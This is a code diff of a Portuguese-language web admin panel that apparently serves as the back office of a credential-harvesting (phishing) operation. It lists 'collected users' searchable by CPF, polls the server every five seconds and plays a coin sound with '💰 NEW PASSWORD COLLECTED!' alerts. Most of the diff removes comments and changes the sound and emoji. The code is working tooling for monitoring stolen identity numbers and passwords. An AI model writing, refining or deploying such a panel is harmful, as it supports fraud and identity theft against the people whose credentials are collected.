@@ -21,7 +21,6 @@
             overflow-y: auto !important;
         }
 
-        /* ========== CANVAS 3D (FUNDO DE ESTRELAS) ========== */
         #bgCanvas {
             position: fixed;
             top: 0;
@@ -32,7 +31,6 @@
             pointer-events: none;
         }
 
-        /* ========== LOADING SCREEN ========== */
         .loading-screen {
             position: fixed;
             top: 0;
@@ -315,7 +313,6 @@
             font-size: 11px;
         }
 
-        /* ========== ADMIN PANEL ========== */
         .admin-panel {
             display: none;
             position: relative;
@@ -702,7 +699,6 @@
 
 <canvas id="bgCanvas"></canvas>
 
-<!-- Loading Screen -->
 <div class="loading-screen" id="loadingScreen">
     <div class="clouds">
         <div class="cloud cloud1"></div>
@@ -723,7 +719,6 @@
     </div>
 </div>
 
-<!-- LOGIN SCREEN -->
 <div id="loginScreen" class="page-container">
     <div class="container">
         <div class="logo">
@@ -754,7 +749,6 @@
     </div>
 </div>
 
-<!-- ADMIN PANEL -->
 <div id="adminPanel" class="admin-panel">
     <div class="menu-toggle" onclick="toggleSidebar()">
         <i class="fas fa-bars"></i>
@@ -801,7 +795,6 @@
             <div class="tab" onclick="switchTab('settings')">CONFIG</div>
         </div>
 
-        <!-- Dashboard Tab -->
         <div id="tabDashboard" class="tab-content active">
             <div class="section-card">
                 <div class="section-title">ÚLTIMAS ATIVIDADES</div>
@@ -809,12 +802,11 @@
             </div>
         </div>
 
-        <!-- Usuários Tab -->
         <div id="tabUsers" class="tab-content">
             <div class="section-card">
-                <div class="section-title" style="display: flex; justify-content: space-between; align-items: center;">
+                <div class="section-title" style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                     <span>LISTA DE USUÁRIOS COLETADOS</span>
-                    <div style="display: flex; gap: 10px;">
+                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                         <div class="search-box">
                             <i class="fas fa-search"></i>
                             <input type="text" id="searchUsers" placeholder="Buscar CPF..." onkeyup="filterUsers()">
@@ -834,7 +826,6 @@
             </div>
         </div>
 
-        <!-- Logs Tab -->
         <div id="tabLogs" class="tab-content">
             <div class="section-card">
                 <div class="section-title">
@@ -848,7 +839,6 @@
             </div>
         </div>
 
-        <!-- Segurança Tab -->
         <div id="tabSecurity" class="tab-content">
             <div class="section-card">
                 <div class="section-title">TENTATIVAS DE ACESSO AO ADMIN</div>
@@ -861,7 +851,6 @@
             </div>
         </div>
 
-        <!-- Configurações Tab -->
         <div id="tabSettings" class="tab-content">
             <div class="section-card">
                 <div class="section-title">ALTERAR SENHA DO ADMIN</div>
@@ -879,7 +868,7 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
-    // ========== CANVAS 3D (ESTRELAS) ==========
+    // CANVAS 3D
     const canvas = document.getElementById('bgCanvas');
     const scene = new THREE.Scene();
     const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
@@ -937,7 +926,7 @@
         renderer.setSize(window.innerWidth, window.innerHeight);
     });
 
-    // ========== FUNÇÕES GERAIS ==========
+    // FUNÇÕES GERAIS
     function toggleSidebar() {
         document.getElementById('sidebar').classList.toggle('open');
     }
@@ -955,7 +944,6 @@
         document.getElementById('loadingScreen').classList.add('hidden');
     }, 1500);
 
-    // ========== SIDEBAR ==========
     function initSidebar() {
         const links = document.querySelectorAll('.sidebar-menu a');
         links.forEach(link => {
@@ -991,7 +979,6 @@
     let allUsers = [];
     let allLogs = [];
 
-    // ========== LOGIN ==========
     async function handleLogin() {
         const username = document.getElementById('loginUser').value.trim();
         const password = document.getElementById('loginPass').value.trim();
@@ -1060,11 +1047,9 @@
         return cpf;
     }
 
-    // ========== CARREGAR DADOS ==========
     async function loadAllData() {
         if (!adminToken) return;
         try {
-            // Stats
             const statsRes = await fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const statsData = await statsRes.json();
             const stats = statsData.stats || {};
@@ -1073,20 +1058,17 @@
             document.getElementById('statTotalLogs').innerText = stats.total_logs || 0;
             document.getElementById('statTentativas').innerText = stats.tentativas_admin || 0;
 
-            // Usuários
             const usersRes = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const usersData = await usersRes.json();
             allUsers = usersData.users || [];
             renderUsers(allUsers);
 
-            // Logs
             const logsRes = await fetch('/api/admin/logs', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const logsData = await logsRes.json();
             allLogs = logsData.logs || [];
             renderLogs(allLogs);
             renderUltimasAtividades(allLogs.slice(0, 15));
 
-            // Tentativas
             const tentativasRes = await fetch('/api/admin/tentativas', { headers: { 'Authorization': `Bearer ${adminToken}` } });
             const tentativasData = await tentativasRes.json();
             renderTentativas(tentativasData.tentativas || []);
@@ -1245,85 +1227,77 @@
             msgDiv.innerHTML = '<span style="color: #f87171;">❌ Erro ao alterar senha</span>';
         }
     }
-<!-- Áudio para notificações -->
-<audio id="notificacaoSom" preload="auto">
-    <source src="https://www.soundjay.com/misc/sounds/beep-01a.mp3" type="audio/mpeg">
-</audio>
 
-<script>
-// ========== SISTEMA DE SOM PARA NOVOS ACESSOS ==========
-let somLigado = true;
-let ultimoTotalUsuarios = 0;
-let ultimoTotalLogs = 0;
+    // ========== SISTEMA DE SOM ==========
+    let somLigado = true;
+    let ultimoTotalUsuarios = 0;
+    let ultimoTotalLogs = 0;
 
-const audioSom = document.getElementById('notificacaoSom');
+    const audioSom = new Audio('https://www.soundjay.com/misc/sounds/coin-drop-01.mp3');
 
-function tocarSom() {
-    if (!somLigado) return;
-    audioSom.currentTime = 0;
-    audioSom.play().catch(e => console.log('Som não reproduzido'));
-}
-
-function alternarSom() {
-    somLigado = !somLigado;
-    const btn = document.getElementById('btnSom');
-    if (btn) {
-        btn.innerHTML = somLigado ? '<i class="fas fa-volume-up"></i>' : '<i class="fas fa-volume-mute"></i>';
+    function tocarSom() {
+        if (!somLigado) return;
+        audioSom.currentTime = 0;
+        audioSom.play().catch(e => console.log('Som não reproduzido'));
     }
-    showToast(somLigado ? '🔊 Sons ativados' : '🔇 Sons desativados', 'info');
-}
 
-// Botão flutuante para ligar/desligar som
-const btnSom = document.createElement('div');
-btnSom.id = 'btnSom';
-btnSom.style.position = 'fixed';
-btnSom.style.bottom = '20px';
-btnSom.style.right = '20px';
-btnSom.style.zIndex = '1000';
-btnSom.style.background = 'rgba(0,0,0,0.7)';
-btnSom.style.backdropFilter = 'blur(10px)';
-btnSom.style.borderRadius = '50%';
-btnSom.style.width = '45px';
-btnSom.style.height = '45px';
-btnSom.style.display = 'flex';
-btnSom.style.alignItems = 'center';
-btnSom.style.justifyContent = 'center';
-btnSom.style.cursor = 'pointer';
-btnSom.style.border = '1px solid rgba(255,255,255,0.2)';
-btnSom.innerHTML = '<i class="fas fa-volume-up" style="color:white; font-size:20px;"></i>';
-btnSom.onclick = alternarSom;
-document.body.appendChild(btnSom);
+    function alternarSom() {
+        somLigado = !somLigado;
+        const btn = document.getElementById('btnSom');
+        if (btn) {
+            btn.innerHTML = somLigado ? '<i class="fas fa-volume-up"></i>' : '<i class="fas fa-volume-mute"></i>';
+        }
+        showToast(somLigado ? '🔊 Sons ativados' : '🔇 Sons desativados', 'info');
+    }
 
-// Função para verificar novos dados
-function verificarNovosDados() {
-    if (!adminToken) return;
-    
-    fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } })
-        .then(res => res.json())
-        .then(data => {
-            const stats = data.stats || {};
-            const totalUsuarios = stats.total_users || 0;
-            const totalLogs = stats.total_logs || 0;
-            
-            if (totalUsuarios > ultimoTotalUsuarios && ultimoTotalUsuarios !== 0) {
-                tocarSom();
-                showToast(`🔔 NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
-            }
-            if (totalLogs > ultimoTotalLogs && ultimoTotalLogs !== 0) {
-                tocarSom();
-                showToast(`📝 NOVA SENHA COLETADA!`, 'info');
-            }
-            
-            ultimoTotalUsuarios = totalUsuarios;
-            ultimoTotalLogs = totalLogs;
-        })
-        .catch(err => console.error('Erro:', err));
-}
+    const btnSom = document.createElement('div');
+    btnSom.id = 'btnSom';
+    btnSom.style.position = 'fixed';
+    btnSom.style.bottom = '20px';
+    btnSom.style.right = '20px';
+    btnSom.style.zIndex = '1000';
+    btnSom.style.background = 'rgba(0,0,0,0.7)';
+    btnSom.style.backdropFilter = 'blur(10px)';
+    btnSom.style.borderRadius = '50%';
+    btnSom.style.width = '45px';
+    btnSom.style.height = '45px';
+    btnSom.style.display = 'flex';
+    btnSom.style.alignItems = 'center';
+    btnSom.style.justifyContent = 'center';
+    btnSom.style.cursor = 'pointer';
+    btnSom.style.border = '1px solid rgba(255,255,255,0.2)';
+    btnSom.innerHTML = '<i class="fas fa-volume-up" style="color:white; font-size:20px;"></i>';
+    btnSom.onclick = alternarSom;
+    document.body.appendChild(btnSom);
 
-// Verificar a cada 5 segundos
-setInterval(() => {
-    if (adminToken) verificarNovosDados();
-}, 5000);
+    function verificarNovosDados() {
+        if (!adminToken) return;
+        
+        fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } })
+            .then(res => res.json())
+            .then(data => {
+                const stats = data.stats || {};
+                const totalUsuarios = stats.total_users || 0;
+                const totalLogs = stats.total_logs || 0;
+                
+                if (totalUsuarios > ultimoTotalUsuarios && ultimoTotalUsuarios !== 0) {
+                    tocarSom();
+                    showToast(`💰 NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
+                }
+                if (totalLogs > ultimoTotalLogs && ultimoTotalLogs !== 0) {
+                    tocarSom();
+                    showToast(`💰 NOVA SENHA COLETADA!`, 'info');
+                }
+                
+                ultimoTotalUsuarios = totalUsuarios;
+                ultimoTotalLogs = totalLogs;
+            })
+            .catch(err => console.error('Erro:', err));
+    }
+
+    setInterval(() => {
+        if (adminToken) verificarNovosDados();
+    }, 5000);
 </script>
 </body>
 </html>
